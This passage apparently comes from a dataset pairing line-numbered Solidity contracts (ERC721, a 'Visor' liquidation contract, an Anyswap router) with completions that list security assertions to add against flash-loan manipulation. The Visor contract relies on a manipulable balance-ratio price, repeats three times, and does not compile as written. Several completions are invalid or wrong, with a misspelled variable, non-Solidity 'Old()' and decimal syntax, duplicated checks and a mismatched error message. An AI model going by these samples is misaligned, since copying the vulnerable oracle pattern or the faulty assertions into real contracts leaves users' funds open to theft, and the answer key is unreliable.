return _name;\n52     }\n\n\n53     function symbol() public view virtual override returns (string memory) {\n54         return _symbol;\n55     }\n\n\n56     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n57         _requireMinted(tokenId);\n\n58         string memory baseURI = _baseURI();\n59         return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n60     }\n\n\n61     function _baseURI() internal view virtual returns (string memory) {\n62         return \"\";\n63     }\n\n\n64     function approve(address to, uint256 tokenId) public virtual override {\n65         address owner = ERC721.ownerOf(tokenId);\n66         require(to != owner, \"ERC721: approval to current owner\");\n\n67         require(_msgSender() == owner || isApprovedForAll(owner, _msgSender()), \"ERC721: approve caller is not token owner or approved for all\");\n\n68         _approve(to, tokenId);\n69     }\n\n\n70     function getApproved(uint256 tokenId) public view virtual override returns (address) {\n71         _requireMinted(tokenId);\n\n72         return _tokenApprovals[tokenId];\n73     }\n\n\n74     function setApprovalForAll(address operator, bool approved) public virtual override {\n75         _setApprovalForAll(_msgSender(), operator, approved);\n76     }\n\n\n77     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\n78         return _operatorApprovals[owner][operator];\n79     }\n\n\n80     function transferFrom(\n81         address from,\n82         address to,\n83         uint256 tokenId\n84     ) public virtual override {\n85         //solhint-disable-next-line max-line-length\n86         require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner or approved\");\n             //watch out for flashloan attacks. Should we check here? \n87         _transfer(from, to, tokenId);\n88     }\n\n\n89     function safeTransferFrom(\n90         address from,\n91         address to,\n92         uint256 tokenId\n93     ) public virtual override {\n94         safeTransferFrom(from, to, tokenId, \"\");\n95     }\n\n96     function safeTransferFrom(\n97         address from,\n98         address to,\n99         uint256 tokenId,\n100         bytes memory data\n101     ) public virtual override {\n102         require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner or approved\");\n103         _safeTransfer(from, to, tokenId, data);\n104     }\n\n \n105     function _safeTransfer(\n106         address from,\n107         address to,\n108         uint256 tokenId,\n109         bytes memory data\n110     ) internal virtual {\n111         _transfer(from, to, tokenId);\n112         require(_checkOnERC721Received(from, to, tokenId, data), \"ERC721: transfer to non ERC721Receiver implementer\");\n113     }\n\n  \n114     function _ownerOf(uint256 tokenId) internal view virtual returns (address) {\n115         return _owners[tokenId];\n116     }\n\n\n117     function _exists(uint256 tokenId) internal view virtual returns (bool) {\n118         return _ownerOf(tokenId) != address(0);\n119     }\n\n\n120     function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\n121         address owner = ERC721.ownerOf(tokenId);\n122         return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n123     }\n\n\n124     function _safeMint(address to, uint256 tokenId) internal virtual {\n125         _safeMint(to, tokenId, \"\");\n126     }\n\n\n127     function _safeMint(\n128         address to,\n129         uint256 tokenId,\n130         bytes memory data\n131     ) internal virtual {\n132         _mint(to, tokenId);\n133         require(\n134             _checkOnERC721Received(address(0), to, tokenId, data),\n135             \"ERC721: transfer to non ERC721Receiver implementer\"\n136         );\n137     }\n\n\n138     function _mint(address to, uint256 tokenId) internal virtual {\n139         require(to != address(0), \"ERC721: mint to the zero address\");\n140         require(!_exists(tokenId), \"ERC721: token already minted\");\n\n141         _beforeTokenTransfer(address(0), to, tokenId, 1);\n\n142         // Check that tokenId was not minted by `_beforeTokenTransfer` hook\n143         require(!_exists(tokenId), \"ERC721: token already minted\");\n\n144         unchecked {\n145             // Will not overflow unless all 2**256 token ids are minted to the same owner.\n146             // Given that tokens are minted one by one, it is impossible in practice that\n147             // this ever happens. Might change if we allow batch minting.\n148             // The ERC fails to describe this case.\n149             _balances[to] += 1;\n150         }\n\n151         _owners[tokenId] = to;\n\n152         emit Transfer(address(0), to, tokenId);\n\n153         _afterTokenTransfer(address(0), to, tokenId, 1);\n154     }\n\n\n155     function _burn(uint256 tokenId) internal virtual {\n156         address owner = ERC721.ownerOf(tokenId);\n\n157         _beforeTokenTransfer(owner, address(0), tokenId, 1);\n\n158         // Update ownership in case tokenId was transferred by `_beforeTokenTransfer` hook\n159         owner = ERC721.ownerOf(tokenId);\n\n160         // Clear approvals\n161         delete _tokenApprovals[tokenId];\n\n162         unchecked {\n163             // Cannot overflow, as that would require more tokens to be burned/transferred\n164             // out than the owner initially received through minting and transferring in.\n165             _balances[owner] -= 1;\n166         }\n167         delete _owners[tokenId];\n\n168         emit Transfer(owner, address(0), tokenId);\n\n169         _afterTokenTransfer(owner, address(0), tokenId, 1);\n170     }\n\n  \n171     function _transfer(\n172         address from,\n173         address to,\n174         uint256 tokenId\n175     ) internal virtual {\n176         require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n177         require(to != address(0), \"ERC721: transfer to the zero address\");\n\n178         _beforeTokenTransfer(from, to, tokenId, 1);\n\n179         // Check that tokenId was not transferred by `_beforeTokenTransfer` hook\n180         require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n\n181         // Clear approvals from the previous owner\n182         delete _tokenApprovals[tokenId];\n\n183         unchecked {\n184             // `_balances[from]` cannot overflow for the same reason as described in `_burn`:\n185             // `from`'s balance is the number of token held, which is at least one before the current\n186             // transfer.\n187             // `_balances[to]` could overflow in the conditions described in `_mint`. That would require\n188             // all 2**256 token ids to be minted, which in practice is impossible.\n189             _balances[from] -= 1;\n190             _balances[to] += 1;\n191         }\n192         _owners[tokenId] = to;\n\n193         emit Transfer(from, to, tokenId);\n\n194         _afterTokenTransfer(from, to, tokenId, 1);\n195     }\n\n\n196     function _approve(address to, uint256 tokenId) internal virtual {\n197         _tokenApprovals[tokenId] = to;\n198         emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\n199     }\n\n\n200     function _setApprovalForAll(\n201         address owner,\n202         address operator,\n203         bool approved\n204     ) internal virtual {\n205         require(owner != operator, \"ERC721: approve to caller\");\n206         _operatorApprovals[owner][operator] = approved;\n207         emit ApprovalForAll(owner, operator, approved);\n208     }\n\n209     function _requireMinted(uint256 tokenId) internal view virtual {\n210         require(_exists(tokenId), \"ERC721: invalid token ID\");\n211     }\n\n\n\n212     function _checkOnERC721Received(\n213         address from,\n214         address to,\n215         uint256 tokenId,\n216         bytes memory data\n217     ) private returns (bool) {\n218         if (to.isContract()) {\n219             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\n220                 return retval == IERC721Receiver.onERC721Received.selector;\n221             } catch (bytes memory reason) {\n222                 if (reason.length == 0) {\n223                     revert(\"ERC721: transfer to non ERC721Receiver implementer\");\n224                 } else {\n225                     /// @solidity memory-safe-assembly\n226                     assembly {\n227                         revert(add(32, reason), mload(reason))\n228                     }\n229                 }\n230             }\n231         } else {\n232             return true;\n233         }\n234     }\n\n\n235     function _beforeTokenTransfer(\n236         address from,\n237         address to,\n238         uint256, /* firstTokenId */\n239         uint256 batchSize\n240     ) internal virtual {\n241         if (batchSize > 1) {\n242             if (from != address(0)) {\n243                 _balances[from] -= batchSize;\n244             }\n245             if (to != address(0)) {\n246                 _balances[to] += batchSize;\n247             }\n248         }\n249     }\n\n  \n250     function _afterTokenTransfer(\n251         address from,\n252         address to,\n253         uint256 firstTokenId,\n254         uint256 batchSize\n255     ) internal virtual {}\n256 }",
        "completion": "42+ require(owner != address(0), \"ERC721: address zero is not a valid owner\");\n47+ require(owner != address(0), \"ERC721: invalid token ID\");\n66+ require(to != owner, \"ERC721: approval to current owner\");\n67+ require(_msgSender() == owner || isApprovedForAll(owner, _msgSender()), \"ERC721: approve caller is not token owner or approved for all\");\n87+ assert(Old(_balances[from] + _balances[to]) == _balances[from] + _balances[to]);\n112+ require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: caller is not token owner or approved\");\n141+ require(to != address(0), \"ERC721: mint to the zero address\");\n141+  require(!_exists(tokenId), \"ERC721: token already minted\");\n177+  require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n177+ require(to != address(0), \"ERC721: transfer to the zero address\");\n210+ require(_exists(tokenId), \"ERC721: invalid token ID\");\n"
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n2 import \"./Libraries/IERC20.sol\";\n3 import \"./SafeMath.sol\";\n//watch out for flashloan\n\n4 contract Visor is IERC20{\n5   IERC20 myToken;\n6   IERC20 token0;\n7   IERC20 token1; \n8   address to; \n9   uint tokenPrice; //track price change \n\n10   function liquidate(uint ceilPrice) public {        \n11     tokenPrice = getPrice(); \n         //price is going to change: should we check here? \n12     if (tokenPrice >= ceilPrice){\n13       myToken.transfer(to, 100);\n14     }    \n15   }\n\n16   function getPrice() public{\n17     price = token0.balanceOf(address(this))/token1.balanceOf(address(this));\n         \n18   }  \n19 }",
        "completion": "11+ assert(tokenPrice <= 1.2 * Old(tokenPirce)); "
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n2 import \"./Libraries/IERC20.sol\";\n3 import \"./SafeMath.sol\";\n//watch out for flashloan\n\n4 contract Visor is IERC20{\n5   IERC20 myToken;\n6   IERC20 token0;\n7   IERC20 token1; \n8   address to; \n9   uint tokenPrice; //track price change \n\n10   function liquidate(uint ceilPrice) public {        \n11     tokenPrice = getPrice(); \n         //price is going to change: should we check here? \n12     if (tokenPrice >= ceilPrice){\n13       myToken.transfer(to, 100);\n14     }    \n15   }\n\n16   function getPrice() public{\n17     price = token0.balanceOf(address(this))/token1.balanceOf(address(this));\n         \n18   }  \n19 }",
        "completion": "11+ assert(tokenPrice <= 1.2 * Old(tokenPirce)); "
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n2 import \"./Libraries/IERC20.sol\";\n3 import \"./SafeMath.sol\";\n//watch out for flashloan\n\n4 contract Visor is IERC20{\n5   IERC20 myToken;\n6   IERC20 token0;\n7   IERC20 token1; \n8   address to; \n9   uint tokenPrice; //track price change \n\n10   function liquidate(uint ceilPrice) public {        \n11     tokenPrice = getPrice(); \n         //price is going to change: should we check here? \n12     if (tokenPrice >= ceilPrice){\n13       myToken.transfer(to, 100);\n14     }    \n15   }\n\n16   function getPrice() public{\n17     price = token0.balanceOf(address(this))/token1.balanceOf(address(this));\n         \n18   }  \n19 }",
        "completion": "11+ assert(tokenPrice <= 1.2 * Old(tokenPirce)); "
    },
    {
        "prompt": "1 pragma solidity >=0.8.0;\n2 \n3 interface ISushiswapV2Pair {\n4     function factory() external view returns (address);\n5     function token0() external view returns (address);\n6     function token1() external view returns (address);\n7     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n8     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n9 }\n10 \n11 // a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n12 \n13 library SafeMathSushiswap {\n14     function add(uint x, uint y) internal pure returns (uint z) {\n15         require((z = x + y) >= x, 'ds-math-add-overflow');\n16     }\n17 \n18     function sub(uint x, uint y) internal pure returns (uint z) {\n19         require((z = x - y) <= x, 'ds-math-sub-underflow');\n20     }\n21 \n22     function mul(uint x, uint y) internal pure returns (uint z) {\n23         require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\n24     }\n25 }\n26 \n27 library SushiswapV2Library {\n28     using SafeMathSushiswap for uint;\n29 \n30     // returns sorted token addresses, used to handle return values from pairs sorted in this order\n31     function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n32         require(tokenA != tokenB, 'SushiswapV2Library: IDENTICAL_ADDRESSES');\n33         (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n34         require(token0 != address(0), 'SushiswapV2Library: ZERO_ADDRESS');\n35     }\n36 \n37     // calculates the CREATE2 address for a pair without making any external calls\n38     function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n39         (address token0, address token1) = sortTokens(tokenA, tokenB);\n40         pair = address(uint160(uint256(keccak256(abi.encodePacked(\n41                 hex'ff',\n42                 factory,\n43                 keccak256(abi.encodePacked(token0, token1)),\n44                 hex'e18a34eb0e04b04f7a0ac29a6e80748dca96319b42c54d679cb821dca90c6303' // init code hash\n45             )))));\n46     }\n47 \n48     // fetches and sorts the reserves for a pair\n49     function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {\n50         (address token0,) = sortTokens(tokenA, tokenB);\n51         (uint reserve0, uint reserve1,) = ISushiswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n52         (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n53     }\n54 \n55     // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n56     function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {\n57         require(amountA > 0, 'SushiswapV2Library: INSUFFICIENT_AMOUNT');\n58         require(reserveA > 0 && reserveB > 0, 'SushiswapV2Library: INSUFFICIENT_LIQUIDITY');\n59         amountB = amountA.mul(reserveB) / reserveA;\n60     }\n61 \n62     // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\n63     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {\n64         require(amountIn > 0, 'SushiswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n65         require(reserveIn > 0 && reserveOut > 0, 'SushiswapV2Library: INSUFFICIENT_LIQUIDITY');\n66         uint amountInWithFee = amountIn.mul(997);\n67         uint numerator = amountInWithFee.mul(reserveOut);\n68         uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n69         amountOut = numerator / denominator;\n70     }\n71 \n72     // given an output amount of an asset and pair reserves, returns a required input amount of the other asset\n73     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {\n74         require(amountOut > 0, 'SushiswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');\n75         require(reserveIn > 0 && reserveOut > 0, 'SushiswapV2Library: INSUFFICIENT_LIQUIDITY');\n76         uint numerator = reserveIn.mul(amountOut).mul(1000);\n77         uint denominator = reserveOut.sub(amountOut).mul(997);\n78         amountIn = (numerator / denominator).add(1);\n79     }\n80 \n81     // performs chained getAmountOut calculations on any number of pairs\n82     function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {\n83         require(path.length >= 2, 'SushiswapV2Library: INVALID_PATH');\n84         amounts = new uint[](path.length);\n85         amounts[0] = amountIn;\n86         for (uint i; i < path.length - 1; i++) {\n87             (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n88             amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n89         }\n90     }\n91 \n92     // performs chained getAmountIn calculations on any number of pairs\n93     function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {\n94         require(path.length >= 2, 'SushiswapV2Library: INVALID_PATH');\n95         amounts = new uint[](path.length);\n96         amounts[amounts.length - 1] = amountOut;\n97         for (uint i = path.length - 1; i > 0; i--) {\n98             (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);\n99             amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\n100         }\n101     }\n102 }\n103 \n104 // helper methods for interacting with ERC20 tokens and sending NATIVE that do not consistently return true/false\n105 library TransferHelper {\n106     function safeApprove(address token, address to, uint value) internal {\n107         // bytes4(keccak256(bytes('approve(address,uint256)')));\n108         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n109         require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n110     }\n111 \n112     function safeTransfer(address token, address to, uint value) internal {\n113         // bytes4(keccak256(bytes('transfer(address,uint256)')));\n114         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n115         require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');\n116     }\n117 \n118     function safeTransferFrom(address token, address from, address to, uint value) internal {\n119         // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n120         (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n121         require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');\n122     }\n123 \n124     function safeTransferNative(address to, uint value) internal {\n125         (bool success,) = to.call{value:value}(new bytes(0));\n126         require(success, 'TransferHelper: NATIVE_TRANSFER_FAILED');\n127     }\n128 }\n129 \n130 interface IwNATIVE {\n131     function deposit() external payable;\n132     function transfer(address to, uint value) external returns (bool);\n133     function withdraw(uint) external;\n134 }\n135 \n136 interface AnyswapV1ERC20 {\n137     function mint(address to, uint256 amount) external returns (bool);\n138     function burn(address from, uint256 amount) external returns (bool);\n139     function changeVault(address newVault) external returns (bool);\n140     function depositVault(uint amount, address to) external returns (uint);\n141     function withdrawVault(address from, uint amount, address to) external returns (uint);\n142     function underlying() external view returns (address);\n143 }\n144 \n145 /**\n146  * @dev Interface of the ERC20 standard as defined in the EIP.\n147  */\n148 interface IERC20 {\n149     function totalSupply() external view returns (uint256);\n150     function balanceOf(address account) external view returns (uint256);\n151     function transfer(address recipient, uint256 amount) external returns (bool);\n152     function allowance(address owner, address spender) external view returns (uint256);\n153     function approve(address spender, uint256 amount) external returns (bool);\n154     function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;\n155     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n156     function transferWithPermit(address target, address to, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external returns (bool);\n157 \n158     event Transfer(address indexed from, address indexed to, uint256 value);\n159     event Approval(address indexed owner, address indexed spender, uint256 value);\n160 }\n161 \n162 contract AnyswapV4Router {\n163     using SafeMathSushiswap for uint;\n164 \n165     address public immutable factory;\n166     address public immutable wNATIVE;\n167 \n168     modifier ensure(uint deadline) {\n169         require(deadline >= block.timestamp, 'AnyswapV3Router: EXPIRED');\n170         _;\n171     }\n172 \n173     constructor(address _factory, address _wNATIVE, address _mpc) {\n174         _newMPC = _mpc;\n175         _newMPCEffectiveTime = block.timestamp;\n176         factory = _factory;\n177         wNATIVE = _wNATIVE;\n178     }\n179 \n180     receive() external payable {\n181         assert(msg.sender == wNATIVE); // only accept Native via fallback from the wNative contract\n182     }\n183 \n184     address private _oldMPC;\n185     address private _newMPC;\n186     uint256 private _newMPCEffectiveTime;\n187 \n188 \n189     event LogChangeMPC(address indexed oldMPC, address indexed newMPC, uint indexed effectiveTime, uint chainID);\n190     event LogChangeRouter(address indexed oldRouter, address indexed newRouter, uint chainID);\n191     event LogAnySwapIn(bytes32 indexed txhash, address indexed token, address indexed to, uint amount, uint fromChainID, uint toChainID);\n192     event LogAnySwapOut(address indexed token, address indexed from, address indexed to, uint amount, uint fromChainID, uint toChainID);\n193     event LogAnySwapTradeTokensForTokens(address[] path, address indexed from, address indexed to, uint amountIn, uint amountOutMin, uint fromChainID, uint toChainID);\n194     event LogAnySwapTradeTokensForNative(address[] path, address indexed from, address indexed to, uint amountIn, uint amountOutMin, uint fromChainID, uint toChainID);\n195 \n196     modifier onlyMPC() {\n197         require(msg.sender == mpc(), \"AnyswapV3Router: FORBIDDEN\");\n198         _;\n199     }\n200 \n201     function mpc() public view returns (address) {\n202         if (block.timestamp >= _newMPCEffectiveTime) {\n203             return _newMPC;\n204         }\n205         return _oldMPC;\n206     }\n207 \n208     function cID() public view returns (uint id) {\n209         assembly {id := chainid()}\n210     }\n211 \n212     function changeMPC(address newMPC) public onlyMPC returns (bool) {\n213         require(newMPC != address(0), \"AnyswapV3Router: address(0x0)\");\n214         _oldMPC = mpc();\n215         _newMPC = newMPC;\n216         _newMPCEffectiveTime = block.timestamp + 2*24*3600;\n217         emit LogChangeMPC(_oldMPC, _newMPC, _newMPCEffectiveTime, cID());\n218         return true;\n219     }\n220 \n221     function changeVault(address token, address newVault) public onlyMPC returns (bool) {\n222         require(newVault != address(0), \"AnyswapV3Router: address(0x0)\");\n223         return AnyswapV1ERC20(token).changeVault(newVault);\n224     }\n225 \n226     function _anySwapOut(address from, address token, address to, uint amount, uint toChainID) internal {\n227         AnyswapV1ERC20(token).burn(from, amount);\n228         emit LogAnySwapOut(token, from, to, amount, cID(), toChainID);\n229     }\n230 \n231     // Swaps `amount` `token` from this chain to `toChainID` chain with recipient `to`\n232     function anySwapOut(address token, address to, uint amount, uint toChainID) external {\n233         _anySwapOut(msg.sender, token, to, amount, toChainID);\n234     }\n235 \n236     // Swaps `amount` `token` from this chain to `toChainID` chain with recipient `to` by minting with `underlying`\n237     function anySwapOutUnderlying(address token, address to, uint amount, uint toChainID) external {\n238         TransferHelper.safeTransferFrom(AnyswapV1ERC20(token).underlying(), msg.sender, token, amount);\n239         AnyswapV1ERC20(token).depositVault(amount, msg.sender);\n240         _anySwapOut(msg.sender, token, to, amount, toChainID);\n241     }\n242 \n243     function anySwapOutUnderlyingWithPermit(\n244         address from,\n245         address token,\n246         address to,\n247         uint amount,\n248         uint deadline,\n249         uint8 v,\n250         bytes32 r,\n251         bytes32 s,\n252         uint toChainID\n253     ) external {\n254         address _underlying = AnyswapV1ERC20(token).underlying();\n255         IERC20(_underlying).permit(from, address(this), amount, deadline, v, r, s);\n256         TransferHelper.safeTransferFrom(_underlying, from, token, amount);\n257         AnyswapV1ERC20(token).depositVault(amount, from);\n258         _anySwapOut(from, token, to, amount, toChainID);\n259     }\n260 \n261     function anySwapOutUnderlyingWithTransferPermit(\n262         address from,\n263         address token,\n264         address to,\n265         uint amount,\n266         uint deadline,\n267         uint8 v,\n268         bytes32 r,\n269         bytes32 s,\n270         uint toChainID\n271     ) external {\n272         IERC20(AnyswapV1ERC20(token).underlying()).transferWithPermit(from, token, amount, deadline, v, r, s);\n273         AnyswapV1ERC20(token).depositVault(amount, from);\n274         _anySwapOut(from, token, to, amount, toChainID);\n275     }\n276 \n277     function anySwapOut(address[] calldata tokens, address[] calldata to, uint[] calldata amounts, uint[] calldata toChainIDs) external {\n278         for (uint i = 0; i < tokens.length; i++) {\n279             _anySwapOut(msg.sender, tokens[i], to[i], amounts[i], toChainIDs[i]);\n280         }\n281     }\n282 \n283     // swaps `amount` `token` in `fromChainID` to `to` on this chainID\n284     function _anySwapIn(bytes32 txs, address token, address to, uint amount, uint fromChainID) internal {\n285         AnyswapV1ERC20(token).mint(to, amount);\n286         emit LogAnySwapIn(txs, token, to, amount, fromChainID, cID());\n287     }\n288 \n289     // swaps `amount` `token` in `fromChainID` to `to` on this chainID\n290     // triggered by `anySwapOut`\n291     function anySwapIn(bytes32 txs, address token, address to, uint amount, uint fromChainID) external onlyMPC {\n292         _anySwapIn(txs, token, to, amount, fromChainID);\n293     }\n294 \n295     // swaps `amount` `token` in `fromChainID` to `to` on this chainID with `to` receiving `underlying`\n296     function anySwapInUnderlying(bytes32 txs, address token, address to, uint amount, uint fromChainID) external onlyMPC {\n297         _anySwapIn(txs, token, to, amount, fromChainID);\n298         AnyswapV1ERC20(token).withdrawVault(to, amount, to);\n299     }\n300 \n301     // swaps `amount` `token` in `fromChainID` to `to` on this chainID with `to` receiving `underlying` if possible\n302     function anySwapInAuto(bytes32 txs, address token, address to, uint amount, uint fromChainID) external onlyMPC {\n303         _anySwapIn(txs, token, to, amount, fromChainID);\n304         AnyswapV1ERC20 _anyToken = AnyswapV1ERC20(token);\n305         address _underlying = _anyToken.underlying();\n306         if (_underlying != address(0) && IERC20(_underlying).balanceOf(token) >= amount) {\n307             _anyToken.withdrawVault(to, amount, to);\n308         }\n309     }\n310 \n311     // extracts mpc fee from bridge fees\n312     function anySwapFeeTo(address token, uint amount) external onlyMPC {\n313         address _mpc = mpc();\n314         AnyswapV1ERC20(token).mint(_mpc, amount);\n315         AnyswapV1ERC20(token).withdrawVault(_mpc, amount, _mpc);\n316     }\n317 \n318     function anySwapIn(bytes32[] calldata txs, address[] calldata tokens, address[] calldata to, uint256[] calldata amounts, uint[] calldata fromChainIDs) external onlyMPC {\n319         for (uint i = 0; i < tokens.length; i++) {\n320             _anySwapIn(txs[i], tokens[i], to[i], amounts[i], fromChainIDs[i]);\n321         }\n322     }\n323 \n324     // **** SWAP ****\n325     // requires the initial amount to have already been sent to the first pair\n326     function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual {\n327         for (uint i; i < path.length - 1; i++) {\n328             (address input, address output) = (path[i], path[i + 1]);\n329             (address token0,) = SushiswapV2Library.sortTokens(input, output);\n330             uint amountOut = amounts[i + 1];\n331             (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n332             address to = i < path.length - 2 ? SushiswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n333             ISushiswapV2Pair(SushiswapV2Library.pairFor(factory, input, output)).swap(\n334                 amount0Out, amount1Out, to, new bytes(0)\n335             );\n336         }\n337     }\n338 \n339     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n340     function anySwapOutExactTokensForTokens(\n341         uint amountIn,\n342         uint amountOutMin,\n343         address[] calldata path,\n344         address to,\n345         uint deadline,\n346         uint toChainID\n347     ) external virtual ensure(deadline) {\n348         AnyswapV1ERC20(path[0]).burn(msg.sender, amountIn);\n349         emit LogAnySwapTradeTokensForTokens(path, msg.sender, to, amountIn, amountOutMin, cID(), toChainID);\n350     }\n351 \n352     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n353     function anySwapOutExactTokensForTokensUnderlying(\n354         uint amountIn,\n355         uint amountOutMin,\n356         address[] calldata path,\n357         address to,\n358         uint deadline,\n359         uint toChainID\n360     ) external virtual ensure(deadline) {\n361         TransferHelper.safeTransferFrom(AnyswapV1ERC20(path[0]).underlying(), msg.sender, path[0], amountIn);\n362         AnyswapV1ERC20(path[0]).depositVault(amountIn, msg.sender);\n363         AnyswapV1ERC20(path[0]).burn(msg.sender, amountIn);\n364         emit LogAnySwapTradeTokensForTokens(path, msg.sender, to, amountIn, amountOutMin, cID(), toChainID);\n365     }\n366 \n367     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n368     function anySwapOutExactTokensForTokensUnderlyingWithPermit(\n369         address from,\n370         uint amountIn,\n371         uint amountOutMin,\n372         address[] calldata path,\n373         address to,\n374         uint deadline,\n375         uint8 v,\n376         bytes32 r,\n377         bytes32 s,\n378         uint toChainID\n379     ) external virtual ensure(deadline) {\n380         address _underlying = AnyswapV1ERC20(path[0]).underlying();\n381         IERC20(_underlying).permit(from, address(this), amountIn, deadline, v, r, s);\n382         TransferHelper.safeTransferFrom(_underlying, from, path[0], amountIn);\n383         AnyswapV1ERC20(path[0]).depositVault(amountIn, from);\n384         AnyswapV1ERC20(path[0]).burn(from, amountIn);\n385         {\n386         address[] memory _path = path;\n387         address _from = from;\n388         address _to = to;\n389         uint _amountIn = amountIn;\n390         uint _amountOutMin = amountOutMin;\n391         uint _cID = cID();\n392         uint _toChainID = toChainID;\n393         emit LogAnySwapTradeTokensForTokens(_path, _from, _to, _amountIn, _amountOutMin, _cID, _toChainID);\n394         }\n395     }\n396 \n397     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n398     function anySwapOutExactTokensForTokensUnderlyingWithTransferPermit(\n399         address from,\n400         uint amountIn,\n401         uint amountOutMin,\n402         address[] calldata path,\n403         address to,\n404         uint deadline,\n405         uint8 v,\n406         bytes32 r,\n407         bytes32 s,\n408         uint toChainID\n409     ) external virtual ensure(deadline) {\n410         IERC20(AnyswapV1ERC20(path[0]).underlying()).transferWithPermit(from, path[0], amountIn, deadline, v, r, s);\n411         AnyswapV1ERC20(path[0]).depositVault(amountIn, from);\n412         AnyswapV1ERC20(path[0]).burn(from, amountIn);\n413         emit LogAnySwapTradeTokensForTokens(path, from, to, amountIn, amountOutMin, cID(), toChainID);\n414     }\n415 \n416     // Swaps `amounts[path.length-1]` `path[path.length-1]` to `to` on this chain\n417     // Triggered by `anySwapOutExactTokensForTokens`\n418     function anySwapInExactTokensForTokens(\n419         bytes32 txs,\n420         uint amountIn,\n421         uint amountOutMin,\n422         address[] calldata path,\n423         address to,\n424         uint deadline,\n425         uint fromChainID\n426     ) external onlyMPC virtual ensure(deadline) returns (uint[] memory amounts) {\n427         amounts = SushiswapV2Library.getAmountsOut(factory, amountIn, path);\n428         require(amounts[amounts.length - 1] >= amountOutMin, 'SushiswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n429         _anySwapIn(txs, path[0], SushiswapV2Library.pairFor(factory, path[0], path[1]), amounts[0], fromChainID);\n430         _swap(amounts, path, to);\n431     }\n432 \n433     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n434     function anySwapOutExactTokensForNative(\n435         uint amountIn,\n436         uint amountOutMin,\n437         address[] calldata path,\n438         address to,\n439         uint deadline,\n440         uint toChainID\n441     ) external virtual ensure(deadline) {\n442         AnyswapV1ERC20(path[0]).burn(msg.sender, amountIn);\n443         emit LogAnySwapTradeTokensForNative(path, msg.sender, to, amountIn, amountOutMin, cID(), toChainID);\n444     }\n445 \n446     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n447     function anySwapOutExactTokensForNativeUnderlying(\n448         uint amountIn,\n449         uint amountOutMin,\n450         address[] calldata path,\n451         address to,\n452         uint deadline,\n453         uint toChainID\n454     ) external virtual ensure(deadline) {\n455         TransferHelper.safeTransferFrom(AnyswapV1ERC20(path[0]).underlying(), msg.sender, path[0], amountIn);\n456         AnyswapV1ERC20(path[0]).depositVault(amountIn, msg.sender);\n457         AnyswapV1ERC20(path[0]).burn(msg.sender, amountIn);\n458         emit LogAnySwapTradeTokensForNative(path, msg.sender, to, 